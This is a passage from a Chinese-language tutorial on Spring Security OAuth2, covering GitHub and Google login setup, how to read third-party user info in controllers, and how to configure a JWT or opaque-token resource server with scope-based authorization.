<li><strong>获取用户信息</strong>: 获得 Access Token 后，模块会用它去请求 GitHub 的 UserInfo 端点，获取用户的详细信息（如用户名、头像、邮箱等）。</li>
<li><strong>创建本地会话</strong>: 模块将获取到的第三方用户信息适配成一个 <code>Authentication</code> 对象，并存入 <code>SecurityContextHolder</code>，创建本地登录会话。</li>
<li><strong>用户登录成功</strong>: 用户被重定向到应用的首页或登录前的目标页面。</li>
</ol>
<p><strong>好消息是：以上所有步骤，Spring Security 都已经为我们自动处理好了！</strong> 我们需要做的主要是提供配置信息。</p>
<hr>
<h4 id="5-3-2-集成第三方登录（以-GitHub-为例）"><a href="#5-3-2-集成第三方登录（以-GitHub-为例）" class="headerlink" title="5.3.2 集成第三方登录（以 GitHub 为例）"></a>5.3.2 集成第三方登录（以 GitHub 为例）</h4><p><strong>步骤 1: 引入依赖</strong></p>
<p>确保你的 <code>pom.xml</code> 中包含了 <code>oauth2-client</code> 依赖：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-oauth2-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>步骤 2: 在第三方平台注册应用</strong></p>
<p>你必须先到你要集成的第三方平台（如 GitHub, Google, Facebook）的开发者中心注册你的应用，以获取凭证。</p>
<p><strong>以 GitHub 为例</strong>:</p>
<ol>
<li>登录 GitHub，进入 <code>Settings</code> -&gt; <code>Developer settings</code> -&gt; <code>OAuth Apps</code> -&gt; <code>New OAuth App</code>。</li>
<li>填写应用信息：<ul>
<li><strong>Application name</strong>: 你的应用名称。</li>
<li><strong>Homepage URL</strong>: 你的应用主页地址，例如 <code>http://localhost:8080</code>。</li>
<li><strong>Authorization callback URL</strong>: <strong>极其重要！</strong> 这是 GitHub 在用户授权后将用户重定向回来的地址。Spring Security 默认的格式是 <code>{baseUrl}/login/oauth2/code/{registrationId}</code>。<ul>
<li><code>baseUrl</code>: 你的应用的基础 URL，例如 <code>http://localhost:8080</code>。</li>
<li><code>registrationId</code>: 你在 <code>application.yml</code> 中为这个提供商起的名字，对于 GitHub，通常就是 <code>github</code>。</li>
<li>所以，这里应该填写 <code>http://localhost:8080/login/oauth2/code/github</code>。</li>
</ul>
</li>
</ul>
</li>
<li>注册成功后，你将获得一个 <strong>Client ID</strong> 和一个 <strong>Client Secret</strong>。<strong>请妥善保管 Client Secret，绝不要泄露到前端或公共代码库中。</strong></li>
</ol>
<p><strong>步骤 3: 配置 <code>application.yml</code></strong></p>
<p>这是最核心的配置步骤。Spring Boot 对常见的 OAuth2 提供商（Google, GitHub, Facebook, Okta）提供了极简的自动化配置。</p>
<p>在 <code>src/main/resources/application.yml</code> 中添加如下配置：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">security:</span></span><br><span class="line">    <span class="attr">oauth2:</span></span><br><span class="line">      <span class="attr">client:</span></span><br><span class="line">        <span class="attr">registration:</span></span><br><span class="line">          <span class="comment"># &quot;github&quot; 是这个配置的 registrationId，必须与回调 URL 中的一致</span></span><br><span class="line">          <span class="attr">github:</span> </span><br><span class="line">            <span class="attr">client-id:</span> <span class="string">YOUR_GITHUB_CLIENT_ID</span> <span class="comment"># 替换成你的 Client ID</span></span><br><span class="line">            <span class="attr">client-secret:</span> <span class="string">YOUR_GITHUB_CLIENT_SECRET</span> <span class="comment"># 替换成你的 Client Secret</span></span><br><span class="line">            <span class="comment"># scope: # (可选) 指定请求的权限范围，如 read:user, user:email</span></span><br><span class="line">          </span><br><span class="line">          <span class="comment"># 如果要同时集成 Google</span></span><br><span class="line">          <span class="attr">google:</span></span><br><span class="line">            <span class="attr">client-id:</span> <span class="string">YOUR_GOOGLE_CLIENT_ID</span></span><br><span class="line">            <span class="attr">client-secret:</span> <span class="string">YOUR_GOOGLE_CLIENT_SECRET</span></span><br><span class="line">            <span class="attr">scope:</span></span><br><span class="line">              <span class="bullet">-</span> <span class="string">openid</span></span><br><span class="line">              <span class="bullet">-</span> <span class="string">profile</span></span><br><span class="line">              <span class="bullet">-</span> <span class="string">email</span></span><br><span class="line"></span><br><span class="line">        <span class="attr">provider:</span></span><br><span class="line">          <span class="comment"># 对于非 Spring Boot 预置的提供商，需要在这里手动配置端点信息。</span></span><br><span class="line">          <span class="comment"># 对于 GitHub, Google 等，这些信息都是自动配置的，所以 provider 部分可以省略。</span></span><br></pre></td></tr></table></figure>

<p><strong>配置解读</strong>:</p>
<ul>
<li><code>spring.security.oauth2.client.registration</code>: 这个路径下定义了所有客户端的注册信息。</li>
<li><code>github</code>: 这是我们为 GitHub 这个提供商定义的 <code>registrationId</code>。</li>
<li><code>client-id</code> &#x2F; <code>client-secret</code>: 填入从 GitHub 获取的凭证。</li>
<li><code>scope</code>: (可选) 定义你希望向用户申请的权限范围。对于 OIDC (如 Google)，<code>openid</code> 是必须的。</li>
</ul>
<p><strong>步骤 4: 启用 OAuth2 登录</strong></p>
<p>在你的 <code>SecurityFilterChain</code> 配置中，启用 <code>.oauth2Login()</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableWebSecurity</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SecurityConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> SecurityFilterChain <span class="title function_">filterChain</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        http</span><br><span class="line">            .authorizeHttpRequests(auth -&gt; auth</span><br><span class="line">                .requestMatchers(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;/login**&quot;</span>).permitAll()</span><br><span class="line">                .anyRequest().authenticated()</span><br><span class="line">            )</span><br><span class="line">            .oauth2Login(Customizer.withDefaults()); <span class="comment">// 启用 OAuth2 登录，使用默认配置</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">return</span> http.build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>oauth2Login()</code> 会自动配置 <code>OAuth2LoginAuthenticationFilter</code>，它负责处理整个 OAuth2 登录流程。</p>
<p><strong>步骤 5: 创建登录链接</strong></p>
<p>Spring Security 默认的登录发起 URL 格式是 <code>/oauth2/authorization/{registrationId}</code>。</p>
<p>你可以在你的登录页面（或任何页面）上添加入口链接：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 在 Thymeleaf 模板中 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>Login with:<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/oauth2/authorization/github&quot;</span>&gt;</span>GitHub<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/oauth2/authorization/google&quot;</span>&gt;</span>Google<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>当用户点击这个链接时，Spring Security 会自动将他们重定向到对应的第三方授权页面。</p>
<p><strong>就是这么简单！</strong> 完成以上步骤后，启动你的应用，访问首页，点击“GitHub”链接，你应该就能体验完整的第三方登录流程了。</p>
<hr>
<h4 id="5-3-3-获取第三方用户信息"><a href="#5-3-3-获取第三方用户信息" class="headerlink" title="5.3.3 获取第三方用户信息"></a>5.3.3 获取第三方用户信息</h4><p>当用户通过 OAuth2 登录成功后，Spring Security 会将获取到的用户信息封装成一个 <code>Authentication</code> 对象，其 <code>Principal</code> 通常是一个 <code>OAuth2User</code> (对于标准 OAuth2) 或 <code>OidcUser</code> (对于 OIDC) 的实例。</p>
<p>你可以在 Controller 中方便地获取这些信息。</p>
<p><strong>方法 1: 从 <code>Authentication</code> 对象获取</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/user/info&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Map&lt;String, Object&gt; <span class="title function_">getUserInfo</span><span class="params">(Authentication authentication)</span> &#123;</span><br><span class="line">        <span class="comment">// 如果是从 OAuth2 登录</span></span><br><span class="line">        <span class="keyword">if</span> (authentication.getPrincipal() <span class="keyword">instanceof</span> OAuth2User) &#123;</span><br><span class="line">            <span class="type">OAuth2User</span> <span class="variable">oauth2User</span> <span class="operator">=</span> (OAuth2User) authentication.getPrincipal();</span><br><span class="line">            <span class="comment">// attributes 包含了从 UserInfo 端点获取的所有用户信息</span></span><br><span class="line">            <span class="keyword">return</span> oauth2User.getAttributes();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 如果是 OIDC 登录 (如 Google)</span></span><br><span class="line">        <span class="keyword">if</span> (authentication.getPrincipal() <span class="keyword">instanceof</span> OidcUser) &#123;</span><br><span class="line">            <span class="type">OidcUser</span> <span class="variable">oidcUser</span> <span class="operator">=</span> (OidcUser) authentication.getPrincipal();</span><br><span class="line">            <span class="comment">// OidcUser 包含更丰富的身份信息</span></span><br><span class="line">            Map&lt;String, Object&gt; claims = oidcUser.getClaims();</span><br><span class="line">            <span class="type">String</span> <span class="variable">email</span> <span class="operator">=</span> oidcUser.getEmail();</span><br><span class="line">            <span class="type">String</span> <span class="variable">fullName</span> <span class="operator">=</span> oidcUser.getFullName();</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">            <span class="keyword">return</span> claims;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 处理其他登录方式...</span></span><br><span class="line">        <span class="keyword">return</span> Map.of(<span class="string">&quot;username&quot;</span>, authentication.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>方法 2: 使用 <code>@AuthenticationPrincipal</code> 注解</strong></p>
<p>这是一种更简洁的方式，可以直接将 <code>Principal</code> 对象注入到方法参数中。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.security.core.annotation.AuthenticationPrincipal;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.oauth2.core.user.OAuth2User;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@GetMapping(&quot;/user/info/principal&quot;)</span></span><br><span class="line"><span class="keyword">public</span> Map&lt;String, Object&gt; <span class="title function_">getUserInfoFromPrincipal</span><span class="params">(<span class="meta">@AuthenticationPrincipal</span> OAuth2User principal)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (principal == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 用户可能不是通过 OAuth2 登录的</span></span><br><span class="line">        <span class="keyword">return</span> Map.of(<span class="string">&quot;error&quot;</span>, <span class="string">&quot;Not an OAuth2 user&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// principal.getAttributes() 返回一个包含用户信息的 Map</span></span><br><span class="line">    <span class="comment">// 例如: &quot;login&quot; -&gt; &quot;username&quot;, &quot;avatar_url&quot; -&gt; &quot;...&quot;, &quot;name&quot; -&gt; &quot;...&quot;</span></span><br><span class="line">    <span class="keyword">return</span> principal.getAttributes();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>@AuthenticationPrincipal</code> 注解会自动进行类型转换。如果用户是通过 OIDC 登录的，你可以直接注入 <code>OidcUser</code> 类型。</p>
<p><strong>自定义处理</strong>:</p>
<p>在实际应用中，当用户首次通过第三方登录时，你可能需要在你的数据库中创建一个对应的用户记录。你可以通过自定义 <code>OAuth2UserService</code> 来实现这个逻辑，将获取到的 <code>OAuth2User</code> 信息保存到你的 <code>User</code> 实体中。</p>
<hr>
<h3 id="5-4-Spring-Security-OAuth2-Resource-Server"><a href="#5-4-Spring-Security-OAuth2-Resource-Server" class="headerlink" title="5.4 Spring Security OAuth2 Resource Server"></a>5.4 Spring Security OAuth2 Resource Server</h3><p>在 OAuth2 的世界里，<strong>资源服务器 (Resource Server)</strong> 是托管受保护资源（如用户数据、业务 API）的一方。它的核心职责是：<strong>接收并验证客户端出示的访问令牌 (Access Token)，只有在令牌有效且具备足够权限时，才允许访问资源</strong>。</p>
<p>Spring Security 的 <code>spring-security-oauth2-resource-server</code> 模块为我们构建这样的服务提供了强大的支持。</p>
<h4 id="5-4-1-核心概念与场景"><a href="#5-4-1-核心概念与场景" class="headerlink" title="5.4.1 核心概念与场景"></a>5.4.1 核心概念与场景</h4><ul>
<li><strong>场景</strong>: 你正在构建一个微服务或一个后端 RESTful API。这个 API 是无状态的，它不会处理用户登录流程。它只信任由一个独立的<strong>授权服务器 (Authorization Server)</strong>（如 Okta, Keycloak, Auth0，或者你自己用 Spring Authorization Server 构建的服务）签发的令牌。</li>
<li><strong>交互流程</strong>:<ol>
<li>前端应用（客户端）通过 OAuth2 流程（如授权码模式）从授权服务器获取到一个 Access Token。</li>
<li>前端应用在每次请求你的 API 时，都在 <code>Authorization</code> 请求头中携带这个令牌：<code>Authorization: Bearer &lt;access_token&gt;</code>。</li>
<li>你的 API 服务（资源服务器）拦截到请求，提取出 Access Token。</li>
<li>资源服务器<strong>独立地</strong>对这个 Token 进行验证。</li>
<li>如果验证通过，资源服务器处理请求并返回数据；否则，返回 <code>401 Unauthorized</code> 或 <code>403 Forbidden</code>。</li>
</ol>
</li>
<li><strong>关键点</strong>: 资源服务器<strong>不关心</strong>令牌是如何获取的，它只关心<strong>如何验证</strong>令牌的有效性。</li>
</ul>
<hr>
<h4 id="5-4-2-令牌验证的两种主要方式"><a href="#5-4-2-令牌验证的两种主要方式" class="headerlink" title="5.4.2 令牌验证的两种主要方式"></a>5.4.2 令牌验证的两种主要方式</h4><p>资源服务器验证 Access Token 的方式主要有两种：</p>
<ol>
<li><strong>JWT (JSON Web Token)</strong><ul>
<li><strong>原理</strong>: JWT 是<strong>自包含</strong>的。它本身就包含了所有验证所需的信息（签名、过期时间、签发者、权限等）。资源服务器只需要知道授权服务器的<strong>公钥</strong>或<strong>对称密钥</strong>，就可以在<strong>本地</strong>对 JWT 进行完整的验证，<strong>无需与授权服务器进行网络通信</strong>。</li>
<li><strong>优点</strong>: 性能高，可扩展性强。因为验证是离线的，不会给授权服务器带来压力。</li>
<li><strong>缺点</strong>: 令牌一旦签发，在过期前通常无法轻易撤销。</li>
</ul>
</li>
<li><strong>Opaque Token (不透明令牌)</strong><ul>
<li><strong>原理</strong>: Opaque Token 本身是一个无意义的、随机的字符串。它不包含任何用户信息。</li>
<li><strong>验证方式</strong>: 资源服务器必须通过网络调用授权服务器提供的一个特殊端点——<strong>内省端点 (Introspection Endpoint)</strong>，将令牌发送过去，由授权服务器来判断该令牌是否有效。</li>
<li><strong>优点</strong>: 安全性更高。授权服务器可以随时撤销任何一个令牌，资源服务器每次查询都能得到最新的状态。</li>
<li><strong>缺点</strong>: 性能较低，增加了网络延迟，并对授权服务器产生了强依赖和负载压力。</li>
</ul>
</li>
</ol>
<p><strong>在现代微服务架构中，JWT 是更常用、更主流的选择。</strong></p>
<hr>
<h4 id="5-4-3-构建受-JWT-保护的资源服务器"><a href="#5-4-3-构建受-JWT-保护的资源服务器" class="headerlink" title="5.4.3 构建受 JWT 保护的资源服务器"></a>5.4.3 构建受 JWT 保护的资源服务器</h4><p><strong>步骤 1: 引入依赖</strong></p>
<p>确保你的 <code>pom.xml</code> 中包含了 <code>oauth2-resource-server</code> 依赖：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-oauth2-resource-server<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>步骤 2: 配置 <code>application.yml</code></strong></p>
<p>你需要告诉资源服务器如何找到用于验证 JWT 签名的公钥。授权服务器通常会通过一个标准的 <strong>JWK Set URI</strong> (<code>.well-known/jwks.json</code>) 来发布其公钥集。</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">security:</span></span><br><span class="line">    <span class="attr">oauth2:</span></span><br><span class="line">      <span class="attr">resourceserver:</span></span><br><span class="line">        <span class="attr">jwt:</span></span><br><span class="line">          <span class="comment"># JWK Set URI: 这是授权服务器发布其公钥的地方。</span></span><br><span class="line">          <span class="comment"># 你的资源服务器会启动时或首次需要时从这个地址下载公钥。</span></span><br><span class="line">          <span class="attr">jwk-set-uri:</span> <span class="string">https://your-auth-server.com/.well-known/jwks.json</span></span><br><span class="line">          </span><br><span class="line">          <span class="comment"># (可选) Issuer URI: 指定期望的签发者。</span></span><br><span class="line">          <span class="comment"># 资源服务器会验证 JWT 中的 &#x27;iss&#x27; 声明是否与此值匹配，增强安全性。</span></span><br><span class="line">          <span class="comment"># Spring Boot 也能从此地址自动发现 JWK Set URI (通过 .well-known/openid-configuration)。</span></span><br><span class="line">          <span class="comment"># issuer-uri: https://your-auth-server.com</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>jwk-set-uri</code>: <strong>核心配置</strong>。指向授权服务器的公钥集地址。</li>
<li><code>issuer-uri</code>: 推荐配置。这不仅可以验证 <code>iss</code> 声明，还能让 Spring Boot 自动发现 <code>jwk-set-uri</code>，使得配置更简洁。如果配置了 <code>issuer-uri</code>，<code>jwk-set-uri</code> 就可以省略。</li>
</ul>
<p><strong>步骤 3: 启用资源服务器支持</strong></p>
<p>在你的 <code>SecurityFilterChain</code> 配置中，启用 <code>.oauth2ResourceServer()</code> 并指定使用 JWT。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableWebSecurity</span></span><br><span class="line"><span class="meta">@EnableMethodSecurity</span> <span class="comment">// 强烈建议开启，以便进行基于 scope/claims 的方法级授权</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SecurityConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> SecurityFilterChain <span class="title function_">filterChain</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        http</span><br><span class="line">            <span class="comment">// 1. 配置所有请求都需要认证</span></span><br><span class="line">            .authorizeHttpRequests(auth -&gt; auth</span><br><span class="line">                .anyRequest().authenticated()</span><br><span class="line">            )</span><br><span class="line">            <span class="comment">// 2. 启用 OAuth2 资源服务器支持，并指定使用 JWT</span></span><br><span class="line">            .oauth2ResourceServer(oauth2 -&gt; oauth2</span><br><span class="line">                .jwt(Customizer.withDefaults())</span><br><span class="line">            );</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">return</span> http.build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>.oauth2ResourceServer(oauth2 -&gt; oauth2.jwt(...))</code>: 这行代码会配置 <code>BearerTokenAuthenticationFilter</code>。这个过滤器负责从 <code>Authorization</code> Header 中提取 Bearer Token (JWT)，然后委托给 <code>JwtDecoder</code> 进行解码和验证。如果验证成功，它会创建一个 <code>JwtAuthenticationToken</code> 并放入 <code>SecurityContextHolder</code>。</li>
</ul>
<p><strong>步骤 4: 基于 Scope&#x2F;Claims 进行授权</strong></p>
<p>一旦 JWT 被成功验证，我们就可以利用其 Payload 中的声明（特别是 <code>scope</code> 或自定义的 <code>authorities</code> 声明）来进行细粒度的授权。</p>
<p><strong>URL 级别授权</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.authorizeHttpRequests(auth -&gt; auth</span><br><span class="line">    <span class="comment">// 要求 Token 必须包含 &quot;read&quot; 这个 scope</span></span><br><span class="line">    .requestMatchers(HttpMethod.GET, <span class="string">&quot;/api/data&quot;</span>).hasAuthority(<span class="string">&quot;SCOPE_read&quot;</span>)</span><br><span class="line">    <span class="comment">// 要求 Token 必须包含 &quot;write&quot; 这个 scope</span></span><br><span class="line">    .requestMatchers(HttpMethod.POST, <span class="string">&quot;/api/data&quot;</span>).hasAuthority(<span class="string">&quot;SCOPE_write&quot;</span>)</span><br><span class="line">    .anyRequest().authenticated()</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p><strong>注意</strong>: Spring Security 会自动为 <code>scope</code> 声明的值添加 <code>SCOPE_</code> 前缀，使其可以被 <code>hasAuthority()</code> 匹配。</p>
<p><strong>方法级别授权 (更推荐)</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/api/data&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DataController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping</span></span><br><span class="line">    <span class="meta">@PreAuthorize(&quot;hasAuthority(&#x27;SCOPE_read&#x27;)&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">readData</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;You have read the data!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping</span></span><br><span class="line">    <span class="meta">@PreAuthorize(&quot;hasAuthority(&#x27;SCOPE_write&#x27;)&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">writeData</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;You have written the data!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 甚至可以基于自定义的 claim 进行判断</span></span><br><span class="line">    <span class="meta">@DeleteMapping(&quot;/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="meta">@PreAuthorize(&quot;hasAuthority(&#x27;SCOPE_delete&#x27;) and #jwt.getClaimAsString(&#x27;department&#x27;) == &#x27;FINANCE&#x27;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">deleteData</span><span class="params">(<span class="meta">@PathVariable</span> String id, <span class="meta">@AuthenticationPrincipal</span> Jwt jwt)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Data &quot;</span> + id + <span class="string">&quot; deleted by someone from FINANCE department.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>@AuthenticationPrincipal Jwt jwt</code>: 可以直接注入解码后的 <code>Jwt</code> 对象，方便地访问其中的任何 claim。</li>
</ul>
<hr>
<h4 id="5-4-4-可选-配置-Opaque-Token-校验"><a href="#5-4-4-可选-配置-Opaque-Token-校验" class="headerlink" title="5.4.4 [可选] 配置 Opaque Token 校验"></a>5.4.4 [可选] 配置 Opaque Token 校验</h4><p>如果你的授权服务器使用不透明令牌，配置方式略有不同。</p>
<p><strong><code>application.yml</code> 配置</strong>:</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">security:</span></span><br><span class="line">    <span class="attr">oauth2:</span></span><br><span class="line">      <span class="attr">resourceserver:</span></span><br><span class="line">        <span class="attr">opaque-token:</span></span><br><span class="line">          <span class="comment"># 内省端点的 URI</span></span><br><span class="line">          <span class="attr">introspection-uri:</span> <span class="string">https://your-auth-server.com/oauth2/introspect</span></span><br><span class="line">          <span class="comment"># 资源服务器自己的凭证，用于向内省端点表明身份</span></span><br><span class="line">          <span class="attr">client-id:</span> <span class="string">your-resource-server-client-id</span></span><br><span class="line">          <span class="attr">client-secret:</span> <span class="string">your-resource-server-client-secret</span></span><br></pre></td></tr></table></figure>

<p><strong>Security 配置</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.oauth2ResourceServer(oauth2 -&gt; oauth2</span><br><span class="line">    .opaqueToken(Customizer.withDefaults())</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>这样配置后，<code>BearerTokenAuthenticationFilter</code> 会将提取到的令牌通过网络请求发送到 <code>introspection-uri</code> 进行验证。</p>
<hr>
